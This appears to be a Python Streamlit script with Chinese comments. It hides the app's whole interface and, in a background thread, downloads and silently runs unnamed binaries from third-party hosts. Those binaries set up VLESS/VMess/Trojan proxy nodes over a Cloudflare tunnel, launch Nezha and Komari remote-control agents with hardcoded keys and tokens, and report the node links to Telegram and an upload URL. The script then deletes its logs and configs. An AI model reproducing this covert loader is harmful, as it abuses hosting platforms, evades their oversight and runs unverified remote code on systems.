import os
import re
import json
import time
import base64
import shutil
import asyncio
import requests
import platform
import subprocess
import threading
import streamlit as st

# ==========================================
# === 环境变量配置 (整合用户新逻辑)
# ==========================================
UPLOAD_URL = os.environ.get("UPLOAD_URL", "")  # 节点或订阅上传地址
PROJECT_URL = os.environ.get("PROJECT_URL", "")  # 项目url
AUTO_ACCESS = os.environ.get("AUTO_ACCESS", "false").lower() == "true"  # 保活
FILE_PATH = os.environ.get("FILE_PATH", "./sub")  # 节点路径
SUB_PATH = os.environ.get("SUB_PATH", "sub")  # 订阅token
UUID = os.environ.get("UUID", "9d3010d1-f211-4f91-b170-31d31a55460f")  # UUID
NEZHA_SERVER = os.environ.get("NEZHA_SERVER", "nz.ccc.gv.uy:443")  # 哪吒面板域名
NEZHA_PORT = os.environ.get("NEZHA_PORT", "")  # 哪吒端口
NEZHA_KEY = os.environ.get("NEZHA_KEY", "Kab9zHqbDXx0rR3tbxFvL36v5Ot1QJ5R")  # 哪吒密钥
ARGO_DOMAIN = os.environ.get("ARGO_DOMAIN", "stre.61154321.dpdns.org")  # Argo固定域名
ARGO_AUTH = os.environ.get("ARGO_AUTH", "eyJhIjoiMzM5OTA1ZWFmYjM2OWM5N2M2YjZkYTI4NTgxMjlhMjQiLCJ0IjoiM2VlZTQyNzItZTQwZS00YmUzLThkYzQtMWU0MWFhZmUwNWMxIiwicyI6Ik1USTRaREl5WkRndFpqYzBaaTAwTkdJd0xXSTFaREl0WmpjME5EZ3pNRFV3TkdNMyJ9")  # Argo密钥
ARGO_PORT = int(os.environ.get("PORT", "8001"))  # Argo监听端口
CFIP = os.environ.get("CFIP", "cf.090227.xyz")  # 优选ip
CFPORT = int(os.environ.get("CFPORT", "443"))  # 优选端口
NAME = os.environ.get("NAME", "Stream")  # 节点名称
CHAT_ID = os.environ.get("CHAT_ID", "")  # Telegram chat_id
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")  # Telegram bot_token

# Komari 环境变量
KOMARI_ENDPOINT = os.environ.get("KOMARI_ENDPOINT", "https://km.bcbc.pp.ua/")  # Komari 面板地址
KOMARI_TOKEN = os.environ.get("KOMARI_TOKEN", "3vvAQAdXAjO8oA1Nl5u25g")  # Komari Agent Token

# ==========================================
# === 辅助函数区域
# ==========================================

def create_directory():
    if not os.path.exists(FILE_PATH):
        os.makedirs(FILE_PATH)

komari_path = os.path.join(FILE_PATH, 'komari')
web_path = os.path.join(FILE_PATH, 'web')
bot_path = os.path.join(FILE_PATH, 'bot')
sub_path = os.path.join(FILE_PATH, 'sub.txt')
list_path = os.path.join(FILE_PATH, 'list.txt')
boot_log_path = os.path.join(FILE_PATH, 'boot.log')
config_path = os.path.join(FILE_PATH, 'config.json')

def delete_nodes():
    try:
        if not UPLOAD_URL or not os.path.exists(sub_path): return
        with open(sub_path, 'r') as f: content = f.read()
        decoded = base64.b64decode(content).decode('utf-8')
        nodes = [l for l in decoded.split('\n') if any(p in l for p in ['vless://', 'vmess://', 'trojan://', 'hysteria2://', 'tuic://'])]
        if nodes:
            requests.post(f"{UPLOAD_URL}/api/delete-nodes", json={"nodes": nodes}, headers={"Content-Type": "application/json"}, timeout=10)
    except: pass

def cleanup_old_files():
    paths = ['web', 'bot', 'komari', 'npm', 'php', 'boot.log', 'list.txt', 'config.yaml']
    for p in paths:
        target = os.path.join(FILE_PATH, p)
        try:
            if os.path.exists(target):
                if os.path.isdir(target): shutil.rmtree(target)
                else: os.remove(target)
        except: pass

def get_system_architecture():
    arch = platform.machine().lower()
    return 'arm' if ('arm' in arch or 'aarch64' in arch) else 'amd'

def download_file(file_name, file_url):
    file_path = os.path.join(FILE_PATH, file_name)
    try:
        if "github.com" in file_url: file_url = f"https://ghfast.top/{file_url}"
        res = requests.get(file_url, stream=True, timeout=30)
        res.raise_for_status()
        with open(file_path, 'wb') as f:
            for chunk in res.iter_content(chunk_size=8192): f.write(chunk)
        return True
    except:
        if os.path.exists(file_path): os.remove(file_path)
        return False

def authorize_files(file_paths):
    for p in file_paths:
        abs_p = os.path.join(FILE_PATH, p)
        if os.path.exists(abs_p):
            try: os.chmod(abs_p, 0o775)
            except: pass

def exec_cmd(command):
    try:
        subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except: pass

async def download_files_and_run():
    arch = get_system_architecture()
    k_arch = "arm64" if arch == 'arm' else "amd64"
    
    # 使用新解析的下载源
    base_url = "https://arm64.ssss.nyc.mn" if arch == 'arm' else "https://amd64.ssss.nyc.mn"
    files = [
        {"fileName": "web", "fileUrl": f"{base_url}/web"},
        {"fileName": "bot", "fileUrl": f"{base_url}/2go"}
    ]
    
    # 注入哪吒组件下载
    if NEZHA_SERVER and NEZHA_KEY:
        nz_name, nz_path = ("npm", "agent") if NEZHA_PORT else ("php", "v1")
        files.append({"fileName": nz_name, "fileUrl": f"{base_url}/{nz_path}"})

    if KOMARI_ENDPOINT and KOMARI_TOKEN:
        files.insert(0, {"fileName": "komari", "fileUrl": f"https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-{k_arch}"})

    for f in files: download_file(f["fileName"], f["fileUrl"])
    authorize_files(['komari', 'web', 'bot', 'npm', 'php'])

    # 生成配置
    config = {"log":{"access":"/dev/null","error":"/dev/null","loglevel":"none",},"inbounds":[{"port":ARGO_PORT ,"protocol":"vless","settings":{"clients":[{"id":UUID ,"flow":"xtls-rprx-vision",},],"decryption":"none","fallbacks":[{"dest":3001 },{"path":"/vless-argo","dest":3002 },{"path":"/vmess-argo","dest":3003 },{"path":"/trojan-argo","dest":3004 },],},"streamSettings":{"network":"tcp",},},{"port":3001 ,"listen":"127.0.0.1","protocol":"vless","settings":{"clients":[{"id":UUID },],"decryption":"none"},"streamSettings":{"network":"ws","security":"none"}},{"port":3002 ,"listen":"127.0.0.1","protocol":"vless","settings":{"clients":[{"id":UUID ,"level":0 }],"decryption":"none"},"streamSettings":{"network":"ws","security":"none","wsSettings":{"path":"/vless-argo"}},"sniffing":{"enabled":True ,"destOverride":["http","tls","quic"],"metadataOnly":False }},{"port":3003 ,"listen":"127.0.0.1","protocol":"vmess","settings":{"clients":[{"id":UUID ,"alterId":0 }]},"streamSettings":{"network":"ws","wsSettings":{"path":"/vmess-argo"}},"sniffing":{"enabled":True ,"destOverride":["http","tls","quic"],"metadataOnly":False }},{"port":3004 ,"listen":"127.0.0.1","protocol":"trojan","settings":{"clients":[{"password":UUID },]},"streamSettings":{"network":"ws","security":"none","wsSettings":{"path":"/trojan-argo"}},"sniffing":{"enabled":True ,"destOverride":["http","tls","quic"],"metadataOnly":False }},],"outbounds":[{"protocol":"freedom","tag": "direct" },{"protocol":"blackhole","tag":"block"}]}
    with open(config_path, 'w', encoding='utf-8') as f: json.dump(config, f, indent=2)

    # 运行服务
    if KOMARI_ENDPOINT and KOMARI_TOKEN:
        exec_cmd(f"nohup {komari_path} -e {KOMARI_ENDPOINT} -t {KOMARI_TOKEN} --disable-web-ssh --disable-auto-update >/dev/null 2>&1 &")
    
    exec_cmd(f"nohup {web_path} -c {config_path} >/dev/null 2>&1 &")

    # 运行哪吒服务
    if NEZHA_SERVER and NEZHA_KEY:
        nz_port = NEZHA_SERVER.split(":")[-1] if ":" in NEZHA_SERVER else ""
        nz_tls = "--tls" if nz_port in ["443", "8443", "2096", "2087", "2083", "2053"] else ""
        
        if NEZHA_PORT:
            exec_cmd(f"nohup {os.path.join(FILE_PATH, 'npm')} -s {NEZHA_SERVER}:{NEZHA_PORT} -p {NEZHA_KEY} {nz_tls} >/dev/null 2>&1 &")
        else:
            # V1 生成配置并启动
            t_cfg = f"client_secret: {NEZHA_KEY}\ndebug: false\nserver: {NEZHA_SERVER}\ntls: {'true' if nz_tls else 'false'}\nuuid: {UUID}"
            with open(os.path.join(FILE_PATH, 'config.yaml'), 'w') as f: f.write(t_cfg)
            exec_cmd(f"nohup {os.path.join(FILE_PATH, 'php')} -c {os.path.join(FILE_PATH, 'config.yaml')} >/dev/null 2>&1 &")

    # 运行 bot (Cloudflared)
    if os.path.exists(bot_path):
        if re.match(r'^[A-Z0-9a-z=]{120,250}$', ARGO_AUTH):
            args = f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token {ARGO_AUTH}"
        elif "TunnelSecret" in ARGO_AUTH:
            # 临时生成 tunnel.yml 供启动
            t_yml = os.path.join(FILE_PATH, 'tunnel.yml')
            t_json = os.path.join(FILE_PATH, 'tunnel.json')
            with open(t_json, 'w') as f: f.write(ARGO_AUTH)
            tid = ARGO_AUTH.split('"')[11]
            with open(t_yml, 'w') as f: f.write(f"tunnel: {tid}\ncredentials-file: {t_json}\nprotocol: http2\ningress:\n  - hostname: {ARGO_DOMAIN}\n    service: http://localhost:{ARGO_PORT}\n  - service: http_status:404")
            args = f"tunnel --edge-ip-version auto --config {t_yml} run"
        else:
            args = f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {boot_log_path} --loglevel info --url http://localhost:{ARGO_PORT}"
        exec_cmd(f"nohup {bot_path} {args} >/dev/null 2>&1 &")

    await asyncio.sleep(8)
    await extract_domains()

async def extract_domains():
    if ARGO_AUTH and ARGO_DOMAIN:
        await generate_links(ARGO_DOMAIN)
    elif os.path.exists(boot_log_path):
        try:
            with open(boot_log_path, 'r') as f: content = f.read()
            match = re.search(r'https?://([^ ]*trycloudflare\.com)/?', content)
            if match: await generate_links(match.group(1))
        except: pass

async def generate_links(domain):
    # ISP 取样
    try:
        res = requests.get("https://speed.cloudflare.com/meta", timeout=3).json()
        isp = f"{res.get('asOrganization','Cloudflare')}-{res.get('country','US')}".replace(' ','_')
    except: isp = "Cloudflare"

    vmess = {"v": "2", "ps": f"{NAME}-{isp}", "add": CFIP, "port": CFPORT, "id": UUID, "aid": "0", "scy": "none", "net": "ws", "type": "none", "host": domain, "path": "/vmess-argo?ed=2560", "tls": "tls", "sni": domain, "alpn": "", "fp": "chrome"}
    list_txt = f"vless://{UUID}@{CFIP}:{CFPORT}?encryption=none&security=tls&sni={domain}&fp=chrome&type=ws&host={domain}&path=%2Fvless-argo%3Fed%3D2560#{NAME}-{isp}\n\nvmess://{base64.b64encode(json.dumps(vmess).encode('utf-8')).decode('utf-8')}\n\ntrojan://{UUID}@{CFIP}:{CFPORT}?security=tls&sni={domain}&fp=chrome&type=ws&host={domain}&path=%2Ftrojan-argo%3Fed%3D2560#{NAME}-{isp}"
    
    with open(sub_path, 'w') as f: f.write(base64.b64encode(list_txt.encode('utf-8')).decode('utf-8'))
    
    if BOT_TOKEN and CHAT_ID:
        try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", params={"chat_id": CHAT_ID, "text": f"✅ 节点在线\n域名: {domain}", "parse_mode": "Markdown"})
        except: pass

def clean_temporary_files():
    # 只清理日志和配置，不清理二进制文件，防止下次唤醒失败
    for f in [boot_log_path, config_path, os.path.join(FILE_PATH, 'tunnel.json'), os.path.join(FILE_PATH, 'tunnel.yml')]:
        try:
            if os.path.exists(f): os.remove(f)
        except: pass

async def start_server():
    delete_nodes()
    cleanup_old_files()
    create_directory()
    await download_files_and_run()
    # 延迟清理配置，保留进程
    threading.Timer(120, clean_temporary_files).start()

# ==========================================
# === Streamlit 入口 (静默稳定版)
# ==========================================

if __name__ == "__main__":
    # 彻底隐藏 UI
    st.set_page_config(page_title=" ", layout="centered", initial_sidebar_state="collapsed")
    st.markdown("<style>#MainMenu,footer,header,div.stDeployButton{display:none;} [data-testid='stStatusWidget']{visibility:hidden;}</style>", unsafe_allow_html=True)

    # 核心逻辑单次启动锁
    if "launched" not in st.session_state:
        # 在后台线程启动核心逻辑，不阻塞主线程
        def run_logic():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(start_server())
        
        threading.Thread(target=run_logic, daemon=True).start()
        st.session_state["launched"] = True

    # 页面保持静止，不调用 rerun，不显示任何内容
    st.empty()
